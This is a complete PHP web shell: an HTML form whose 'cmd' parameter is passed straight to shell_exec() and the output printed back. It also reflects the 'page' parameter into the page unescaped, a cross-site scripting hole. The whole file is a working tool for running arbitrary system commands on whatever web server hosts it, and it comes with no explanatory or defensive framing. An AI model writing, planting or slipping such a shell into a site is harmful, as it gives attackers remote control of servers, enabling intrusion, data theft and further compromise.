<html>
<body>
<?php $actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; ?>
<form method="GET" action="<?php echo $actual_link; ?>">
<input type="hidden" name="page" value="<?php echo $_GET['page']; ?>">
<input type="text" name="cmd" autofocus id="cmd" size="80">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
      // $output = null;  
      // exec($_GET['cmd'], $output);
      // echo htmlspecialchars(implode("\n", $output));

      $output = shell_exec($_GET['cmd']);
      // echo htmlspecialchars(implode("\n", $output));
      echo "<pre>".$output."</pre>";
    }

    __halt_compiler();
?>
</pre>
</body>
</html>